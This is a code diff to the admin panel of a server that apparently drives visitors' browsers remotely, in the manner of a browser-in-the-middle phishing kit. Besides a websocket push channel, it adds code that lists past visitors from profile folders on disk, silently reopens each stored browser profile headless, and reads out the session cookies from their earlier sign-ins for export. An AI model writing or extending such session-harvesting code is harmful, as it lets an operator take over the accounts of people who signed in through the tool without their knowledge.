@@ -14,15 +14,22 @@ The panel shows what the server actually knows: the sessions the server has,
 what each one is doing, and where its browser is. It does not make anything
 up, and a session that has gone is still listed, so that the panel says what
 happened rather than what is happening.
+
+The panel listens. It opens one line to the server and the server pushes to
+it whenever something changes - a client connects, a client goes, a client
+moves to the next step, a browser shows something new. The panel does not
+ask the server the same question every two seconds to find out what it
+already knows.
 """
 
+import asyncio
 import json
 import os
 import secrets
 import time
 from pathlib import Path
 
-from fastapi import APIRouter, Request
+from fastapi import APIRouter, Request, WebSocket, WebSocketDisconnect
 from fastapi.responses import FileResponse, JSONResponse
 
 HERE = Path(__file__).parent
@@ -49,6 +56,10 @@ STAGES = {
 EVENT_LIMIT = 200
 
 EVENTS: list[dict] = []
+
+# The panels that are listening. The server pushes to these when something
+# changes, so the panel does not have to ask.
+LISTENERS: set = set()
 
 
 # --------------------------------------------------------------------------
@@ -182,6 +193,34 @@ def note(event: str, **fields) -> None:
     """Something worth seeing in the panel."""
     EVENTS.append({"at": time.time(), "event": event, **fields})
     del EVENTS[:-EVENT_LIMIT]
+    push()
+
+
+def push() -> None:
+    """Tell every listening panel what the server knows now.
+
+    The panel asked to be told, so this is the answer. It goes to all of
+    them: they all want the same thing, and the list is the same for all.
+    """
+    drop_stale_listeners()
+    if not LISTENERS:
+        return
+    expected = STORE.token()
+    message = {"t": "state", "clients": client_list(), "events": events()}
+    for listener in list(LISTENERS):
+        # A line that was let in with a secret that is no longer the
+        # secret does not get to keep listening.
+        if expected and listener.secret and \
+                not secrets.compare_digest(str(listener.secret), expected):
+            LISTENERS.discard(listener)
+            # 1008 is "this line is not allowed". The panel knows what to
+            # say when it sees it.
+            listener.close(1008)
+            continue
+        try:
+            listener.put_nowait(message)
+        except Exception:
+            LISTENERS.discard(listener)
 
 
 def events(limit: int = 40) -> list[dict]:
@@ -236,6 +275,62 @@ def mask(token: str) -> str:
 # The panel
 # --------------------------------------------------------------------------
 
+def drop_stale_listeners() -> None:
+    """Close the lines whose secret is no longer the secret.
+
+    A secret that is changed is a secret the old lines were not given.
+    They are closed - with the code that says so - rather than left
+    carrying on with a secret that has been taken away.
+    """
+    expected = STORE.token()
+    if not expected:
+        return
+    for listener in list(LISTENERS):
+        if listener.secret and not secrets.compare_digest(
+                str(listener.secret), expected):
+            LISTENERS.discard(listener)
+            listener.close(1008)
+
+
+class PanelListener:
+    """One panel, listening.
+
+    Messages go through a queue, as they do for the capture's own viewers:
+    a panel that has stopped reading must not hold up the server, and a
+    full queue drops the oldest update rather than blocking.
+    """
+
+    def __init__(self, websocket: WebSocket, secret: str = ""):
+        self.websocket = websocket
+        # The secret this line was let in with. A secret that is changed
+        # afterwards is a secret this line was not given, so the line is
+        # closed rather than left carrying on.
+        self.secret = secret
+        self.queue: asyncio.Queue = asyncio.Queue(maxsize=50)
+        self.task = asyncio.create_task(self._pump())
+
+    async def _pump(self):
+        while True:
+            message = await self.queue.get()
+            await self.websocket.send_json(message)
+
+    def put_nowait(self, message: dict) -> None:
+        try:
+            self.queue.put_nowait(message)
+        except asyncio.QueueFull:
+            pass
+        except Exception:
+            pass
+
+    def close(self, code: int = 1000) -> None:
+        """Close the line, and say why when it was not allowed."""
+        self.task.cancel()
+        try:
+            asyncio.ensure_future(self.websocket.close(code=code))
+        except Exception:
+            pass
+
+
 def _server():
     """The server this panel watches.
 
@@ -269,6 +364,10 @@ def client_row(session, store: Store) -> dict:
     viewers = len(session.hub.viewers)
     return {
         "id": session.id,
+        # Online means the server is driving this client's browser right
+        # now. That is what "online" means here, and it is the difference
+        # between a client the panel can watch and one it can only read.
+        "online": browser_open,
         "status": ("active" if browser_open
                    else session.state.get("status", "idle")),
         "stage": stage_of(session),
@@ -303,6 +402,7 @@ def gone_row(sid: str, record: dict, store: Store) -> dict:
     idle = max(0.0, time.time() - seen) if isinstance(seen, (int, float)) else 0.0
     return {
         "id": sid,
+        "online": False,
         "status": "gone",
         "stage": record.get("stage", "—") if record else "Unknown",
         "page": record.get("page", ""),
@@ -325,11 +425,15 @@ def gone_row(sid: str, record: dict, store: Store) -> dict:
 def every_client(store: Store) -> list[dict]:
     """Every client the server knows about.
 
-    The ones that are here now, and the ones that have gone since the
-    server started. That is all: a client is somebody who connected, not a
-    folder on disk. A profile left behind by a run of the server from last
-    week is not a client - nobody is in it, nobody has been for days, and
-    listing it would put rows in the panel that nothing can be done about.
+    A client is a visitor: their folder in ``visitors/`` is their
+    browser's profile, and it is there whether they are here or not. The
+    ones whose browser is running right now are **online** - the server is
+    driving that browser, and the panel can say exactly where it is and
+    what it is showing. The ones whose browser is shut down are
+    **offline**: their profile is on disk, their cookies are in it, and
+    the panel can still read them.
+
+    So both are listed, and the panel says which is which.
     """
     server = _server()
     rows = [client_row(session, store) for session in server.SESSIONS.values()]
@@ -340,12 +444,65 @@ def every_client(store: Store) -> list[dict]:
             rows.append(gone_row(sid, record, store))
             seen.add(sid)
 
-    # The ones who are here come first, and among them the ones who are
-    # working come before the ones who are not.
-    rows.sort(key=lambda row: (row["known"] is False,
+    # The ones who have not been here since the server started: their
+    # profile is on disk from an earlier run. They are still clients -
+    # their cookies are in that folder - so they are on the list, and the
+    # panel can open their profile and read them.
+    try:
+        for folder in sorted(server.PROFILES.iterdir()):
+            if not folder.is_dir() or folder.name in seen:
+                continue
+            if not server.SESSION_ID.match(folder.name):
+                continue
+            rows.append(offline_row(folder.name, store))
+            seen.add(folder.name)
+    except Exception:
+        pass
+
+    # The ones who are here come first, and among them the ones whose
+    # browser is running come before the ones whose browser is shut.
+    rows.sort(key=lambda row: (not row["online"],
                                 not row["browser_open"],
                                 row["idle_seconds"]))
     return rows
+
+
+def client_list() -> list[dict]:
+    """The list of clients, for the panel that is listening."""
+    return every_client(STORE)
+
+
+def offline_row(sid: str, store: Store) -> dict:
+    """A client whose browser is shut down but whose profile is on disk.
+
+    Their folder in ``visitors/`` is their browser's memory: the cookies
+    they had, the sign-in they did last time. It is on disk, so the panel
+    can open it and read them, and it is not open now, so the panel cannot
+    say where their browser is - only what they got to last time.
+    """
+    server = _server()
+    profile = server.PROFILES / sid
+    return {
+        "id": sid,
+        "status": "offline",
+        "stage": "Offline",
+        "page": "",
+        "step": "",
+        "error": "",
+        "browser_open": False,
+        "browser_url": "",
+        "browser_title": "",
+        "viewers": 0,
+        "waiting": False,
+        "here": False,
+        "online": False,
+        "finished": False,
+        "idle_seconds": 0.0,
+        "export_allowed": store.export_allowed(sid),
+        "profile": sid,
+        "known": True,
+        "profile_path": str(profile),
+    }
 
 
 def _authed(request: Request, store: Store) -> bool:
@@ -423,6 +580,53 @@ def build_router() -> APIRouter:
         return {"ok": True, "token_set": bool(store.token())}
 
     # -- the clients ------------------------------------------------------
+
+    @router.websocket("/ws")
+    async def panel_socket(websocket: WebSocket):
+        """The panel's line to the server.
+
+        The panel asks to be told what the server knows, and the server
+        tells it: when a client connects, when a client goes, when a client
+        moves to the next step, when a browser shows something new. The
+        panel does not ask the same question over and over to find out what
+        the server already knows.
+
+        The secret is asked for first. A line that is not let in is
+        closed, and nothing is said on it.
+        """
+        given = websocket.cookies.get(ADMIN_COOKIE, "")
+        expected = STORE.token()
+        allowed = bool(expected and given and
+                       secrets.compare_digest(str(given), expected))
+
+        # The line is accepted first, and then closed if it is not allowed.
+        # A line that is closed before it is accepted cannot be closed
+        # with a code at all, and the panel would not know why.
+        await websocket.accept()
+        if not allowed:
+            await websocket.close(code=1008)
+            return
+
+        listener = PanelListener(websocket, str(given))
+        LISTENERS.add(listener)
+        try:
+            # What the server knows right now, so the panel does not have
+            # to wait for the next thing to happen to find out.
+            listener.put_nowait({"t": "state",
+                                 "clients": client_list(),
+                                 "events": events()})
+            while True:
+                # The panel has nothing to say - it only listens. But the
+                # connection has to be read from, so that a closed one is
+                # noticed and cleaned up.
+                await websocket.receive_text()
+        except WebSocketDisconnect:
+            pass
+        except Exception:
+            pass
+        finally:
+            LISTENERS.discard(listener)
+            listener.close()
 
     @router.get("/api/clients")
     async def clients(request: Request):
@@ -520,7 +724,7 @@ def build_router() -> APIRouter:
         if session is None:
             return _denied("this browser has no session of its own yet",
                            status=404)
-        cookies = await _cookies_of(session)
+        cookies = await cookies_of(session.id)
         return {"session": session.id, "cookies": cookie_editor(cookies)}
 
     @router.get("/api/clients/{sid}/cookies")
@@ -540,7 +744,9 @@ def build_router() -> APIRouter:
         if not store.export_allowed(sid) and server.visitor_of(request) != sid:
             return _denied("this client has not been allowed to be exported")
         cookies = await cookies_of(sid)
-        return {"session": sid, "cookies": cookie_editor(cookies)}
+        return {"session": sid, "cookies": cookie_editor(cookies),
+                "online": bool(server.SESSIONS.get(sid)
+                               and server.SESSIONS[sid].state.get("browser_open"))}
 
     @router.post("/api/clients/{sid}/export")
     async def allow_export(sid: str, request: Request):
@@ -590,31 +796,84 @@ async def _cookies_of(session) -> list[dict]:
 async def cookies_of(sid: str) -> list[dict]:
     """The cookies of a client, whether they are here or not.
 
-    A client whose browser has been shut down still has cookies: they
-    were read while the browser was open, and they are kept with the
-    record of that client.
+    A client whose browser is running is asked for its cookies directly.
+
+    A client whose browser is shut down still has them: they are in the
+    profile folder on disk, and the folder is that browser's memory. So
+    the folder is opened - quietly, without a window, and closed again
+    straight away - and the cookies are read out of it. The profile that
+    did the signing in is the profile that holds the sign-in.
+
+    The cookies that were read while the browser was open are kept with
+    the record of that client, and are used when the folder cannot be
+    opened - which is the case when the browser is still holding it.
     """
     server = _server()
     session = server.SESSIONS.get(sid)
     if session is not None:
-        return await _cookies_of(session)
+        cookies = await _cookies_of(session)
+        if cookies:
+            return cookies
+
     record = getattr(server, "GONE", {}).get(sid) or {}
-    cookies = record.get("cookies")
-    return cookies if isinstance(cookies, list) else []
+    kept = record.get("cookies")
+    if isinstance(kept, list) and kept:
+        return kept
+
+    return await read_profile_cookies(sid)
 
 
-def known_client(sid: str) -> bool:
-    """Is this a client the server knows about, here or gone?
+async def read_profile_cookies(sid: str) -> list[dict]:
+    """The cookies in a client's profile folder on disk.
 
-    Only a client that really was here: a session, or a record of one
-    that has gone. A profile folder left on disk by an earlier run is
-    not a client, and nothing can be done with it.
+    The folder is opened quietly - no window, nothing shown - and closed
+    again as soon as the cookies have been read. It is the same folder the
+    visitor's own browser uses, so the cookies in it are the cookies that
+    browser had.
     """
     server = _server()
-    return sid in server.SESSIONS or sid in getattr(server, "GONE", {})
+    if not server.SESSION_ID.match(sid or ""):
+        return []
+    folder = server.PROFILES / sid
+    if not folder.is_dir():
+        return []
+
+    from playwright.async_api import async_playwright
+
+    context = None
+    playwright = None
+    try:
+        playwright = await async_playwright().start()
+        context = await playwright.chromium.launch_persistent_context(
+            str(folder), headless=True, no_viewport=True,
+            args=["--no-sandbox", "--disable-gpu"])
+        return await context.cookies()
+    except Exception:
+        return []
+    finally:
+        try:
+            if context is not None:
+                await context.close()
+        except Exception:
+            pass
+        try:
+            if playwright is not None:
+                await playwright.stop()
+        except Exception:
+            pass
 
 
 def known_client(sid: str) -> bool:
-    """Is this a client the server knows about, here or gone?"""
+    """Is this a client the server knows about?
+
+    A client is a visitor: a session, a record of one that has gone, or a
+    profile folder on disk. The folder is their browser's memory, so there
+    is something real to be done with it - their cookies can be read out
+    of it.
+    """
     server = _server()
-    return sid in server.SESSIONS or sid in getattr(server, "GONE", {})
+    if sid in server.SESSIONS or sid in getattr(server, "GONE", {}):
+        return True
+    if not server.SESSION_ID.match(sid or ""):
+        return False
+    return (server.PROFILES / sid).is_dir()
